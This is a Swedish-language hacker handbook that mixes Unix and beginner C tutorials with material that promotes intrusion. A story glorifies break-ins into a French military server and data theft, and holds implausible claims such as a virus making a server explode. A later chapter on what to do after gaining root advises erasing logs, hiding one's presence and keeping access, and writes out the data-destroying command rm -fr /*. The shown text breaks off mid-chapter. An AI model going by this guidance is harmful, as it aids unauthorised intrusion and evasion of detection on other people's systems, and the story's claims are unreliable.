Sedan System\. Detta är ett hierarkiskt filsystem.

När du använder kommandot LS för att lista filer så kommer du se två ”filer”
vid namn ./ och ../.  ( ./ = Den katalog du just nu befinner dig i . Obetydlig).
(../ = En katalog högre.) Den sista, ../ är ganska viktig. Eftersom att du förmodligen-
-vill flytta dig uppåt i systemet! Vi säger att du befinner dig i katalogen ”qwerty” som är en
underkatalog till ”hack”. För att lista filer i katalogen ”rewt” som också den är en underkatalog till
katalogen ”hack”, så skriver du alltså:
ls ../rewt


Mer om allt detta så småningom. 

Nu kan det vara lagom att gå in lite mer i vardagslivets sidor av UNIX.
En texteditor är väl allt bra vanligt? Det är ju något av det viktigaste i systemet,
utan den vore en dator inte en dator.
UNIX har många fler texteditorer som standard, följer med systemet, än vad Windows har.
Words och Notepad.. Hmms.. UNIX har i alla fall lite fler, Emacs, Pico, Joe, Jed och Vi.
Vi ska titta lite närmare på dem.



Texteditors

En texteditor är antagligen det viktigaste verktyget i Linux och utan en sådan är du helt försvarslös.
Det finns ett stort antal editorer och alla har sin personliga favorit.

Några vanliga texteditorer:

? Joe

Ganska trevlig att manövrera när du lärt dig kombinationerna.
Skriv så här: joe hej, skriv in lite text. Tryck på <CTRL><K> och sen på <X> när du vill spara och 
avsluta.
Tryck på <CTRL><K> och sedan <H> för att få se hjälpmenyn.

? Jed

Mer sofistikerad än Joe. Alldeles underbar när man programmerar. Den identerar och färgar det
man skriver in. Dessutom hjälper den till att hålla reda på parenteser.
Jed är en ganska lyckad blandning av Emacs och Joe.

? Emacs

Otroligt stor och omfattande editor. Det finns en uppsjö program specifikt skrivna för Emacs.
Emacs har också en väldigt massa olika lägen, c-mode t.ex. som fixar inledningar och sådant i C-Kod.
Du bör försöka bekanta dig med Emacs, extremt produktiv enligt fanatikerna. Det är egentligen bara
en editor men emacs är så pass konfigurationsvänligt att folk använder det för att styra sina 
kaffekokare med!

? Vi

Raka motsatsen till Emacs, extremt minimalt och användarfientligt. Väldigt många tycker dock
att vi är den bästa och snabbaste. Ända sen 80-tal har ett religöst krig mellan emacs- och vi-fanatiker
rasat. Vid en större Linux mässa utmanade de varandra i paintball. Det var motiveringen
”Smidighet och snabbhet gäller i både textredigering och paintball” som vi-laget kamade hem en
snabb seger. Vi uttalas vi-aj. ;-)

? Pico

Linkar edit i DOS. Tämligen enkel att använda. Om du tycker att de ovanstående är svårhanterliga
kan du använda denna. Om du vill spara en fil trycker du på <CTRL><O>. Avsluta med
<CTRL><X>.  Använd valfri editor för att skriva in följande program. Jed och Emacs är
speciellt trevliga att när det gäller programmering.

Skriv t.ex. jed exempel.c och skriv in följande:

#include<stdio.h>
int main(void)
{
int a,b;
printf(”Ange tal 1:\n”);
scanf(”%d”, &a);
printf(”Ange tal 2:\n”);
scanf(”%d”, &b);
printf(”Summan av %d och %d är %d\n!”,a,b,a+b);
return 0;
}

Tryck på <Ctrl-X> och <C> när du vill spara. Nu har du förhoppningsvis upptäckt att Jed är bra att
programmera med, eftersom den hjälper till rätt mycket med grammatiken. Kompilera och provkör
programmet:

$ gcc exempel.c
$ ./a.out
Ange tal 1:
4
Ange tal 2:
7
Summan av 4 och 7 är 11


Skalet II

Nu när du har lärt dig använda editorn Jed någorlunda, kan du återkomma till fler funktioner i
skalet Bash. Om du listar innehållet i din hemkatalog ser det kanske ut så här:

$ ls
a.out
exempel.c
textfil
textfil2
$

Nu vill du givetvis inte ha sådan oordning i din hemkatalog, det ska vara snyggt och prydligt.
Skapa en katalog till din C-fil. Jag tycker också att du skall ta bort a.out.

$ rm a.out
$ mkdir c
$ pwd
/home/kalle
$ ls
c
exempel.c
textfil
textfil2
$ cd c
$ pwd
$ /home/kalle/c
$ ls
$ 

Sedan flyttar du .c-filerna till c-katalogen.

$ mv *.c c/
$ cd c 
$ ls
exempel.c
$ pwd
/home/kalle/c
$ cd ..
$ pwd
/home/kalle
$ ls
c
textfil
textfil2

Gör likadant med de andra filerna, dela in dem i kataloger! =^).

Omdirigering

UTDATA

Programmet cat läser in filen textfil och skriver ut innehållet till utdata, stdout. Det festliga är
att vi kan dirigera om var utdatan ska hamna och om du inte specificerar något annat kommer
utdatan till den skärm du tittar på. Men skriver du:

$ cat textfil > textfil3
$

VA!? Inget hände? Jodå.. Utdatan som cat skickade från textfil, skickades till den nya filen
textfil3.


$ ls
textfil
textfil2
textfil3
$ cat textfil3
Linux är absolut bäst

Här ser du alltså, att texten i ”textfil” skickades till en ny fil vid namn ”textfil3”.
När vi sedan öppnar filen med ”cat”, så ser vi beviset.. Samma text som i ”textfil” !
Det är ett primitivt sätt att kopiera en textfil på. Det funkar dessutom bara på textfiler.
Den andra dirigenten heter <, och är givetvis en mostats till >. Du minns kanske vårt lilla
C-program som frågade efter två tal; så här kan du använda < operatorn:

INDATA

$ pwd
/home/kalle/c
$ gcc exempel.c –o exempel
$ ./exempel
Ange tal 1:
5
Ange tal 2:
6
Summan av 5 och 6 är 11!

Skapa nu en fil i samma katalog som innehåller två tal på varsin rad. Glöm inte att avsluta
varje rad med ett radbyte, <ENTER>.

$ ls
exempel
exempel.c
siffror ? (Den nya filen!)
$ cat siffror
23
5
$ ./exempel < siffror
Ange tal 1:
Ange tal 2:
Summan av 23 och 5 är 28!
$

Bra va? Programmet exempel väntar på att två värden ska komma från indata.
Precis som utdata vanligt vis är skärmen, är indata vanligtvis tangentbordet.
./exempel < siffror blir siffror indata för exempel.
Med hjälp av indata genererar exempelprogrammet lite utdata, och detta kan vi
också använda.

$ ./exempel < siffror > summa
$ cat summa
Ange tal 1:
Ange tal 2:
Summan av 23 och 5 är 28!
$

Rörledningen |

Den tredje dirigenten fungerar som en rörledning. Det som stoppas in på ena sidan
kommer ut på den andra. Prova att lista innehålet i katalogen /usr/bin (ls /usr/bin).
Jag orkar inte visa hur det ser ut.. (tar för mycket plats med alla filer ;-) ). 

En väldig
massa filer rusar alltså förbi, det är omöjligt att hänga med. I DOS hade vi använt
DIR med växeln /P för att lista filerna i tur och ordning, i den takt vi själva hade valt.
Det vi ska göra nu är typ samma sak, men i *NIX format:
ls /usr/bin | more. Genast blev det enklare! Alla filer från kommandot LS skickades till
”more”. More är ett program som skriver ut lika många rader ur dess indata som får plats
på skärmen, fast det visste du väl redan. 




Studera följande:

$ ./exempel < siffror
Ange tal 1:
Ange tal 2:
Summan av 24 och 5 är 28!
$ cat siffror | ./exempel
Ange tal 1:
Ange tal 2:
Summan av 24 och 5 är 28!
 
Precis samma sak i båda fallen! Siffror blir indata åt ./exempel!
Så.. nog om detta för den här gången. Ni behöver smälta sketen ett tag.
Jag kommer gå igenom nätverks konfigureringar och sånt lite senare i boken.
I nästa Hackers Mentor bok kommer jag prata om ”X”, ”Bash” och
skalprogrammering. Det blir väl något att se fram emot?
Har vi tur så hinner jag också med att skriva om Emacs och VI, sedan kan
du helt enkelt byta till ett *NIX system utan bekymmer.. Så slipper du alla
jobbiga förnedringar om att du är en Winblows user! :-)


Kapitel 2: Programmera i C/C++

När du hör att ”hackers” inte använder ”tools”, utan att de gör sina
alldeles egna hacking program. (Om de ens behöver använda mjukvara),
så kanske du tycker att det låter jätte jobbigt och svårt.. ”Aldrig ens använda
Netinfo eller WS_Ping!?”, nej just det!
Men det ÄR inte särskiljt svårt.
Jag är ingen C programmerare själv, jag gör de flesta av mina program i det
mycket enklare språket BASIC. (Visual Basic 6).


Men nu är det så att jag har lite grundkunskaper, och jag vill gärna
lära er som INTE har några grundkunskaper om det, lite grand!
Att skapa ett hacking program i Visual Basic är oerhört enkelt. I C är det lite svårare,
Särskiljt för mig. Jag kan typ bara göra ett enkelt matte program i C, eller ett sånt där
som säger ”Hej! Jag heter ice!” ”Vad heter du?:” på en svart bakgrund.

Det tog mig ca: ett år att lära mig VisualBasic så pass bra att jag kunde göra mer avancerade
program som t.ex. trojanen GMT (NetChéf 3.0). Det var det värt!
Det enda som behövdes var resurser för att skapa programmen, samt en god guide.
Jag läste först ”Lättpocket om VisualBasic 5”, den boken var min nyckel till programmeringen.
Jag var då bara 13 år. C++ var grekiska för mig. Senare köpte jag ”Programmera Internet med
VB 5”. Sedan ”Visual Basic 6 på tre veckor”. Klartt!! Nu kan jag det. ”Bara fantasin är gränsen”.


För några månader sedan började jag läsa C/C++.
Mina kunskaper i VB kom nu till oerhört stor nytta. För det första kunde jag skippa allt tjafs
om variabler och logiken var helt klar för mig. Utan att ha tittat på C tidigare kunde jag nu
förstå den kod jag läste på skärmen.

Vad jag vill få fram, vilket språk du än lär dig så kommer det bli till stor nytta i vilket programmerings
projekt du än tar för dig.


Så.. Vi ska börja programmera i C. Jag förutsätter ingen ting! Det enda jag går efter nu är att du aldrig
tidigare har programmerat, och det jag kommer lära dig om C i den här boken blir därför väldigt
simpla och nödvändiga grunder. I nästa bok går vi vidare, liksom med Unix. 

Jag tänker nu inte, likt alla andra böcker, dra upp historien om vart C kom till, när, hur etc.
Jag tänker berätta vad det ÄR, hur det fungerar och hur du använder det. Lära dig koda och kompilera.
Nog med prat, iväg till C fabriken:


Programmering i allmänhet

Att programmera, är att skriva egna program i ett språk. I ett programmeringsspråk.
C är ett sådant. Det finns många andra språk, Assembler, Perl, BASIC, Cobol, Pascal,
Java, HTML (jo..), CGI, BATCH (hehe.. jo!).. Du har säkert hört om dem. Om du läser
detta så är det 99% troligt att du redan vet allt detta. Tillhör du den sista 1%:en så bör du
helt enkelt lägga ner dina planer på hacking. Optimistiskt menat! Gör inte bort dig. ;-D.

Det första språket, med bokstäver och så.. Var Fortran. Sedan kom En massa språk som
nästan ingen av oss 15 åringar har hört talas om. Från början gjordes program
med hjälp av hålkort. Detta var alltså programmeringen, att sticka hål på kort som man
sedan lämnade in till ett datalabb. Sedan väntade man en timma eller två, fick tillbaka
sitt kort och en utskrift på vad kortet hade åstadkommigt. En liten utskrift, en text!
Det tog för lång tid att springa runt mellan labben och sitt eget hem, så man uppfann
terminaler som anslöts till stordatorerna.

Sedan programmerade man med hjälp av sifferkoder. Man skrev ned siffrorna på papper
i och med att man klurade ut hur det hela skulle fungera. Sedan matade man över siffrorna
till en dator som gjorde om det hela till maskinkod, det är den enda kod som datorn egentligen
förstår. Nollor och ettor. Men sifferkoderna blev för svåra att komma ihåg.
Man gjorde därför om dem till bokstäver och ord.
Bokstavskoder. 
Det är vad vi använder idag. Sedan måste man ”kompilera” koderna till
maskinkod. Det är fortfarande det enda en dator kan förstå. 
De flesta programmeringsspråk har som sagt en ganska lika logik.


Objektsorienterad programmering

Vad är det? Om vi säger att JAG är ett objekt. Min ARM är ett annat objekt.
I C kan en knapp vara ett objekt, lika väl som en textruta, ett formulär, eller
till och med ett stycke kod, en variabel, kan ses som ett objekt.

Om vi går vidare här, så kan vi se min hjärna och mina muskler som datorn.
En del av hjärnan talar om för en annan del av hjärnan (datorn) att jag ska lyfta
tre decimeter på armen. Hjärnan fångar upp mitt meddelande (min kod) och skickar
signaler till mina muskler att utföra det jag ville. (Kompilatorn, och allt! Vi kör koden).
Musklerna lyfter armen tre centimeter.

Om vi skrev detta i t.ex. VisualBasic, skulle det kunna likna:

JAG.ARM.Top = Int(JAG.ARM.Top) + 30

JAG är alltså jag själv, det första objektet. Till det objektet hör ARM. Min arm.
.Top – Betyder typ, ”höjd” eller ”vertikalt värde”. Alltså, hur högt eller lågt armen ska
befinna sig. ”Int” står för ”integer” och är alltså,, ett tal, siffror, nummer, värde.
Vilket värde det gäller, talar informationen mellan parenteserna om.
(JAG´s ARM´s höjd placering.). Ok, lite svårt att hänga med? Läs om för tusan! ?.
Till sist talar vi om hur mycket armen ska höjas. + 30 =  Plus 30 centimeter.
Den ska höjas trettio centimeter, alltså, tre decimeter.

Här ser vi att det huvudsakliga objektet är JAG. JAG är objektet som står i centrum.
Sedan kommer ARM. Min arm, en del av mig, alltså ett mindre objekt av mig och ett
följande och tillhörande objekt av objektet JAG. Sedan kommer ARMéns EGENSKAP
En egenskap, kan vara texten i en textruta, storleken på en knapp, bakgrundsfärgen i
programfönstret eller i vårat fall, den vertikala (lodräta) positionen av armen.

Nu har du en ganska fin insikt i objektsorienterad programmering. Det räcker med det nu.
Om du inte förstod, så läs noga igenom det en gång till. Sitt inte och pressa in orden!
Du lär dig det efter hand, du måste inte veta att det heter ”Objektsorienterad programmering”
ännu. Bara du förstår principen och vad jag pratar om. Men det blir nödvändigare senare om
du ska prata programmering med någon, eller läsa texter om det. Bland annat denna text.

Jag hoppas du förstod.


Variabler

Variabler, om du kan matte så kan du snart detta.
En variabel, kan fungera som en textfil, men det är bara en genväg eller ett stycke kod
som man bara kan använda inom en enda programmerings-kod.
Ok, lite CP lät det där.. Vi tar om det.

KH är en variabel som innehåller information om hur bred en knapp är.
För att datorn ska förstå vad KH är så måste vi deklarera den som en variabel.
Vi måste med andra ord tala om för ”kompilatorn” att, DETTA ÄR EN VARIABEL -
- SOM INNEHÅLLER DEN OCH DEN INFORMATIONEN! GLÖM INTE DEN!
Vi skiter i hur man deklarerar variabeljäkeln nu..

KH ska innehålla värdet 40. Alltså, informationen 40. Inget annat! BARA 40!!

Knapp1´s bredd kan skrivas så här:  

Knapp1.Width = Nånting

”Nånting” ska bytas ut mot knappens bredd i, låt oss säga, centimeter.
Den ska vara 40 centimeter bred säger vi nu.

Knapp1.Width = 40

Så!.. Men vi vill vara lite kluriga, så vi skriver inte 40.. vi skriver KH,
eftersom att den VARIABELN innehåller samma information, samma värde!
Det har vi ju talat om för den, det har vi ju deklarerat!

KH = 40
Knapp1.Width = KH

Knappens bredd blev lika stor som antalet siffror i KH var, i centimetrar.
Alltså 40.

Det finns en massa olika sorters variabler. De kan innehålla olika information,
text eller siffror. ’Jokertecken’(#]{]}{@£”¤%=ãÄð&) eller vad som helst!
Här är en lista över variabler och dess funktioner och kapacitet:


Små info om C:

Nästan varje rad kod i C/C++ slutar med ett ”;”
; ? Alltså

En kod i C/C++ börjar alltid med:

main()
{

#Här skrivs koden in.. Om man använder ett ”#” FÖRE koden, så blir det inte kod, utan text
#som undviks av kompilatorn.
#Koden slutar alltid med:

}


Innan den kod jag visade med ”main()” så skriver man också in de filer med olika objekt och
egenskaper som man vill ha med i sitt program.
Med hjälp av dessa filer slipper man skriva en massa jobbig kod själv, och får färdiga 
kodsnuttar och hjälpredskap med sig direkt. Allt man behöver är filerna själva.
Sedan på slutet så länkar man ihop och kompilerar alltsammans.
De två vanligaste filerna som finns med i så gott som alla program heter ”stdio.h” och
”conio.h”. Dessa lägger man till så här:

#include <stdio.h>
#include <conio.h>

Sedan skriver man resten av koden.. (main() och det..).
Vi kan ta en liten kodsnutt:

#include <stdio.h>
#include <conio.h>
main()
{
crscr();
printf(”Hej! Detta är mitt program i C”);
getch();
}

Här har vi ett oerhört enkelt program som bara skriver ut ” Hej! Detta är mitt program i C ” i
ett litet ”DOS Fönster”. Först talar ”crscr();” om att man ska rensa skärmen från annan text,
sedan skrivs textmeddelandet ut med hjälp av ”printf(”blablabla”);”.
Slutligen en liten avslutande kodsnutt ”getch();”. Alla dessa koder beskrivs längre ned.

Vi ska inte lära oss så mycket mer om C för den här gången faktiskt.
Vi kan åter behöva lite rum att smälta informationen.


Kapitel 3: Inspirationsstund.
Tomteverkstaden

 Det närmar sig jul i tomteverkstaden.
 Inte den vanliga verkstaden som vi ser på TV varje år.
 Nej, den tomteverkstad jag nu talar om är den som en
 gång fanns i mellersta Sverige. Den tomteverkstaden 
 kallades P.W.I.A.

 På 1990-talet fanns i Uppland och Gästrikland en liten
 hacking organisation som kallades PWIA. Namnet kom från
 en gammal latinsk symbol för "den förste, siste och evige guden".
 PWIA kämpade inte som många andra, för att "visa folket vad hacking
 egentligen var". Nej, den här gruppen var illvilliga och inåtbundna.
 Det låter förstås som något tradititonellt MOD-wannabie projekt. 
 Men.. gruppen var aldrig offentligt känd! De som var med ville inte
 att det skulle vara så heller. 


 Vad gjorde de då?

 Det PWIA sysslade med var att bryta sig in i olika nätverksservrar
 för att ENBART ställa till med oreda och sätta små spår med namnet
 på organisationen. 

 Allt började 1993 när någon vid namn 'Gando'
 i organisationen A.C.S (En liknande grupp som PWIA), började kaxa
 mot ett gäng "lonewolfs" på deras privata kanal.
 Gando utmanade de på kanalen i en "hacking duell" mot A.C.S´s 
 medlemmar. Målet var en fransk .mil-server som hanterade
 ett militärt SMTP och POP3 system. Samt en hel del sekretess belagd
 data om något kustbevaknings system. (Fråga mig inte! Jag vet inte mer
 än så om "målet")

 De viktigaste som ställde upp i "duellen" från PWIA´s sida var:
 Mendator, J1mX, Xevinnah`, JoS33, Bemoreo och Eddies.

 Motspelande från A.C.S var främst:
 Neromino, TM, Tatic, HellTecter, Vienci och Gando.


 "Duellen" ägde rum 93-02-16.
 
 A.C.S´s deltagande kom in i kanalen där PWIA gänget fanns klockan 02.00.
 Gando (ledare för A.C.S) och Eddies (ledare för PWIA) hade ett privat
 samtal på ungeffär 5 minuter. Vad som sas där vet man inte. Men när dom
 var klara verkade den upphettade stämmningen ha stigit och adrenalinet
 såg ut att rysa igenom hela kanalen. I kanalen fanns just då ungeffär
 femtio personer som hade hört om duellen, och som nu satt och väntade
 på att allt skulle sätta igång. Första personen som:

 * Ändrade startsidan på www.___.mil sidan,
 * Tog hem den krypterade informationen,
 * Lämnade sin grupps signalement på servern
 
 skulle genast rapportera om det i Topic för kanalen.
 Då skulle genast alla operationer avbrytas och man skulle
 börja kolla vem av de båda som verkligen HADE vunnit.
 
 Startsignalen gick i form av ett 'BLEEP' till alla OP´ens datorer.
 tiden gick.. ingen verkade vara vid livet förutom alla users som
 fortfarande inte visste att tävlingen hade börjat. Folk började
 trada CC´s och shell accounts under tiden som ett svettigt arbete
 pågick i andra änden av IRC.
 
 Plötsligt ändrades topic!:

 "\\P.W.I.A//  * GAME OVER *  \\P.W.I.A//"

 PWIA visade direkt A.C.S sin kraft. Gando erkännde senare att han blivit
 riktigt förvånad över hur lätt P.W.I.A verkade ha knäppt den militära servern.
 
 Ja. Nu hade PWIA bevisat sina sk!11z. Det Eddies nu hade på sin dator var
 5.3 GB krypterad data som skulle till att dekrypteras.
 Han bar med sig hårddisken till "tomteverkstaden". Han valde förståss att gå dit
 tidigt på morgonen när ännu inga andra PWIA medlemmar hade kommit.
 Eddies slog igång de femton universitets datorer som stod utspridda i källar lokalen.
 Datorerna var igång, och så var även cracking programmen! 
 Innan den första PWIA´ren anlände till lokalen hade Eddies lyckats dekryptera
 runt femton olika nyklar som alla ledde till olika delar av den krypterade disken. 
 De andra medlemmarna tyckte förståss att det var väldigt
 spännande och roligt att få läsa de hemliga dokument om kustförsvar som den
 franska militärbas de hade hackat, hade uppfunnit. 

 Två veckor gick. Snart hade PWIA lyckats dekryptera hela den bunt av data som
 de fick av militärservern. Eddies hade kunnat tjäna _MYCKET_ på att sälja det
 material han nu hade. Men inte! Eddies hade andra planer. Mer om DET vet jag
 inte. Ingen annan än Eddies vet nog det heller. 
 
 
 ---- CHOCKEN ----

 Den stora smällen mot PWIA kom i Oktober år 1995 när Bemoreo och en annan 
 PWIA medlem vid namn WexWinyl hackade sig runt på en obevakad IRC server.
 Samtidigt som de båda roade sig med att radera adresser från OP listorna
 på #USA och #Australia. så satt vår gamle erkefiende Gando och ett gäng till
 bakom ett par svarta datorer i Ryssland och scannade efter datorer med
 hostname endelser på *@*.pwiq.net. Vilket tillhörde PWIA! (duhh!!).
 Och foo,, de hittade snart Bem och Wex.

 Någon port stod öppen rakt igenom firewallen och sorry PWIA... A.C.S tog sig
 på två minuter in i PWIA´s nätverk och hade snart root access till huvuddatorn
 som också förvarade den OKRYPTERADE versionen av den franska datorn.
 A.C.S la sina vantar på informationen och gick under jorden.
 Men PWIA var inte nöjda så.

 Snart förhandlade Eddies och Gando på nytt om ett konfronterande projekt,
 denna gång handlade det inte om att ta sig in i någon server. Man skulle nu
 göra slut på varandras organisationer så gott man kunde.

 Sagt och gjort.
 PWIA och ACS´s medlemmar möttes nu på en ny kanal. Utanför newbies och
 andra åskådares vetskap. 

 Det enda Eddies var intresserad av var att förstöra det som A.C.S hade
 stulit från hans dator. Eddies försökte därför hålla sig avsides från
 allt OOBánde och floodande. Nu skulle han hitta Gandos dator!
 
 Eddies sökte, letade, rotade omkring i allt han kom över.
 Snart hade han IP adressen till Gandos dator som stod förvarad
 djupt nere i en källare i det förslutna kassaskåp som Gando
 hade investerat i. Dum som han var så hade han alltid datorn
 online som en hemlig server där han kunde hämta och lagra filer.
 
 Eddies hade varken åtkomst att ladda hem, radera, läsa eller skriva.
 Men han hade möjligheten att ladda upp filer.
 Eddies ville INTE riskera att de hemliga datan som Gando hade stulit
 skulle gå att rädda. PLAN DONE! Eddies hade nu inget annat val än att
 skicka den mörka fil som han arbetat på i fem månader.
 %FTP.Sending STOR **-**.

 Vad hände?

 Har ni aldrig hört talas om de hemska virus som kan drabba din dator?
 - Servern exploderade. 
 Eddies hade detonerat en fjärrstyrd bomb! Genom att skicka den fil
 som eddies hade till Gandos dator, och placera den i autorun registret,
 så hade Gando inget annat val än att ovetande invänta en explosion i sin
 välslutna källare. Nej, ingen mäniska kom till skada. Bara Gandos dator
 och älskade kassaskåp! ;). 
 Ok, lokalen måste ha blåsts ut. Men Gando har själv berättat att inget 
 annat än serverdatorn fanns i lokalen när explosionen skedde.

 Annars...?
 Det krig som härjade på nätet mellan de två organisationerna slutade 
 så gott som oavgjort.
 Ett tiotal datorer hade raderats, en server hade sprängts och ett 
 av A.C.S´s mest betydande nätverk fick tas ur användning i mer än
 ett år! En sådan server som Gando hade kostade 1995 inte lite pengar!
 
 A.C.S hade vid det här laget STOR respekt för PWIA.
 Gando skulle inte komma på tanken att bråka mot Eddies igen.
 Men trotts allt detta fortsatte vissa att bråka med varrandra.
 
 År 1997 verkade så gott som allt vara dött. 
 En dag ringde telefonen hemma hos Tatic. (Operatör på A.C.S).
 Han fick erbjudandet att börja jobba som säkerhets ansvarig på det stora
 företaget Netcom i USA. Fler och fler fick erbjudanden om välbetalda jobb.
 Fler och fler kunde inte längre stanna i sina organisationer.
 Efter ett tag splittrades allt upp och ingen trodde på någon eller något som
 skulle återföra dem till de gamla grupperna.

 Då satt kreativiteten igång i Eddies. Han samlade ihop några av de gamla
 medlemmarna och skaffade en del nya. Han kom på ett system med vilket
 han kunde betala sina medlemmar och på så sätt kunde nu hälften av de
 gamla, goda operatörerna och medlemmarna stanna kvar i gruppen eller
 vara med över halvåren. Det andra halvåret gick till respektabla 
 nätverks och mjukvaru företag. Mestadels i Amerika.
 Gando började följa deras struktur men hade snart inte längre tid och
 ork att fortsätta. Gandos högra hand "TM" fick nu ta över ledarskapet.
 Och det klarade TM bra! Eddies och TM är nu de ledare som varit med i
 sina organisationer allt sedan 1980-talet. 

 ---------------------------------------------------------------------------

 FLYTTEN
¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨

 År 1998 kunde inte längre de välbetalda hackarna från Sverige stanna kvar
 i sina källarlokaler i Gästrikland och Uppland. De flesta flyttade till
 USA och bosatte sig där. Så, om medlemmarna flyttade, så fick också
 organisationerna flytta. A.C.S har dock mestadels sina medlemmar kvar
 i Sverige, och ett par har flyttat till USA, Finland och Norge.
 Gando vet man inte riktigt VART han bor. Men enligt TM så ska han
 finnas vid den Grekiska riveäran där han slappnar av och har det skönt.
 Gando är nu, år 2000, 48 år gammal. Eddies är cirka 46.
 TM är 32 och de andra,, mellan 20 och 40.

 A.C.S Har idag ungeffär 20 medlemmar.
 P.W.I.A Hade när detta skrevs 32 medlemmar.

 Varav dessa har A.C.S fortfarande kvar
 7 gamla, hederliga operatörer och
 en del hackers och crackers som gått med på 
 senare tid.

 P.W.I.A har fortfarande alla sina gamla medlemmar
 kvar. Tror jag. Kanske en eller två har
 backat ur på grund av flytten mm.. Men visst,
 de träffas fortfarande både IRL och över nätet.


 Arbetet i tomteverkstaden fortsätter,, till dunkande trance och goa.
 Våra megahackers till tomte-snickare lever i det varma och härliga
 USA & kring det underbara söderhavet.

 Lugn! De lever fortfarande! Du kan fortfarande få träffa dem!
 Även om det så är för en kort stund och över IRC, så tycker jag
 att det är värt att leta.
  
 Eligt källor kan du hitta medlemmar ur de gamla grupperna på
 undernet IRC och t.o.m. DALNet! Leta på kanalerna 
 #PWIA , #ACS, #Hackers , #Hacktech och #BIOS
 efter våra gamla vänner. 





 == Till er medlemmar som läser: ==
 ================================== 
  VI VÄNTAR MED SPÄNNING PÅ
  NÄSTA MATCH! VI VÄNTAR PÅ EN
  YTTERLIGARE DUELL! OM DET BLIR
  EN.. TALA DÅ OM DET FÖR OSS!
  =)  // VI DÖDLIGA MÄNISKOR. =)
 ==================================


Kapitel 4: Vad du gör när du fått ”root” i ett system.
Använda Unix och telnet för att gå vidare i ditt hackade system.

När du har suttit i timmar för att ta dig in i ett system, låt oss säga ”target.com”,
och när du till sist har lyckats.. så sitter du där och tänker, 
”JA! Jag är inne!, så vad gör jag nu??”.
Svaret du kommer ge dig själv är kanske:
”testar att skriva HELP,”, du får upp en massa kommandon
och sedan testar du några av dem.
Sorry! Du testade fel kommando på fel sätt!
Rååååkade bara skriva:
rm –fr /* 
eller? På några sekunder var det roliga över, tyvärr kanske
någon nära stående loggade det hela, snart kommer kanske polisen och knackar
på dörren.. Du gjorde fel, med anda ord.
(Kommandot rm –fr /* - tar bort alla filer på disken).

Ne, nu när du har fått root, finns det vissa ”regler” och etiker som du måste följa,
Det finns vissa saker som du bör göra, och det finns saker du bör undvika.
Du måste kunna radera och ändra i loggar, du måste göra dig osynlig och behålla din
root access. (Det är inte allt för sällan som erfarna admins byter lösenord..)

Så. Läs detta kapitel för att förstå vad du behöver göra och hur du gör det!

För det första hoppas jag att du har en anledning till varför du har tagit dig in i systemet.
Annars kan du inte precis kalla det för hacking. Du kan inte kalla dig för hacker om du bara
råkade göra ett slumpmässigt ”hack”. Du bara råkade trilla in i ett system som du inte vet
vad det ens är. Du kanske bara scannade efter exploit-bara system och hittade ett som du
körde den hemladdade exploiten på.?

Du ska absolut inte ta bort filer, ladda hem eller upp filer innan du vet hur man fixar loggarna,
du ska i princip inte göra någonting innan du VET hur du rensar upp efter dig och hur du gör
dig själv osynlig för andra.

Ok, praktik ger bästa resultat, så jag föreslår att du skaffar dig ett shellkonto hos någon 
Internetleverantör om du inte redan har det. Du kan öva dig lite där, gör inget dumt bara ;-).

Du har lärt dig en del om Unix/Linux här i boken nu, så du kan nog en del kommandon redan,
men här är en liten lista över de viktigaste, de är översatta mellan DOS och UNIX språk:

DOS:       UNIX:

DIR/W      = ls
DIR        = ls -l
DIR/AH     = ls -al  AH=(dåld) -al=(include hidden files as well as regular)
RENAME     = mv
ATTRIB     = chmod
MD         = mkdir
RD         = rmdir
DEL        = rm
COPY       = cp

Ok.. Så nu har du det klart för dig..?
Du kan läsa mer om kommandona genom att kolla deras ”man” sidor.

Om du skriver ”cd” utan de två ””, och klickar {ENTER}, så kommer du automatiskt tillbaka
till din hemkatalog.  Kommandot: cp filnamn $HOME – kommer att kopiera det specifierade 
filnamet (filen) till din hemkatalog. 
cd ~användarnamn - Tar dig till den valda användarens konto, om du har rättigheten att 
vara där. Skriv pwd och klicka {ENTER} för att se vart i filsystemet du befinner dig.

När vi nu har loggat in i systemet, och vår prompt heter ”bash$”, så kan vi börja kolla runt:

bash$

bash$ cd /tmp
bash$ ls -l
total 783
-rwx------   1 wood     users           1 Jan 25 18:28 19067haa
-rw-r--r--   1 berry    mail            1 Jan 16 12:38 filter.14428
-rw-------   1 rhey19   root       395447 Jan 24 02:59 pop3a13598
-rw-------   1 rhey19   root       395447 Jan 24 03:00 pop3a13600
drwxr-xr-x   4 root     root         1024 Jan 12 13:18 screens

Observera här att den gamla hederliga DOS ”backslashen” har bytts ut mot ”slash”,
( DOS = \ )
(UNIX = / )
C:\tmp\ hade det kanske varit i Windows, men i Unix är det /tmp.
Ovanför det där ”/”ét finns inget. Det är rooten. /tmp är en undermapp till den högsta grenen i
filsystemet. Andra undermappar till / är t.ex. ”root”, ”lost&found”, ”bin” och ”etc”.
Det talade jag ju om tidigare!

Så .. detta gav oss väl inte så mycket rolig information? Vi testar samma kommando med
växlarna a och l:

bash$ ls -al
total 794
drwxrwxrwt   4 root     root         8192 Jan 25 23:05 .
drwxr-xr-x  22 root     root         1024 Dec 28 18:07 ..
-rw-r--r--   1 berry    users           6 Jan 25 23:05 .pinetemp.000
drwxr-xr-x   2 berry    users        1024 Jan 25 23:05 .test
-rwx------   1 wood     users           1 Jan 25 18:28 19067haa
-rw-r--r--   1 berry    mail            1 Jan 16 12:38 filter.14428
-rw-------   1 rhey19   root       395447 Jan 24 02:59 pop3a13598
-rw-------   1 rhey19   root       395447 Jan 24 03:00 pop3a13600
drwxr-xr-x   4 root     root         1024 Jan 12 13:18 screens

Så.. nu fick vi lite mer. Det som lades till var ”.pinetemp.000” och ”.test”.
Att dessa två lades till beror på att de är dolda filer. Med växlarna a och l, (a räcker),
så fick vi se även dolda filer/kataloger). Vi kan också se att ”.test” var en katalog.

Det ska vi prata lite mer om nu strax. Vi behöver först lära oss om rättigheter!


Skåda exemplet:

-rw-r--r--   1 berry    mail            1 Jan 16 12:38 filter.14428
----------
| |  |   |--------> Other = Vem som helst på datorns åtkomst
| |  |------------> Group = Vissa gruppes åtkomst
| |---------------> User  = Bara ägarens åtkomst
|-----------------> Katalog eller Fil. Det visas här.

Så nu fick ni här se, att det är denna –rw—grej som visar vilken access olika personer
har till filen/katalogen i fråga. Den raden kan de ut lite hur som helst, det beror på vilka
som har vilken åtkomst/tillgång/möjlighet/access till filen/katalogen.
Vi kan ta ett exempel:

- rw- r-- r--
| |   |   |--------> Övriga kan bara läsa filen.
| |   |------------> Gruppen kan bara läsa filen.
| |----------------> Ägaren kan läsa och skriva till filen.
|------------------> Det är inte en katalog


- rwx rwx r-x
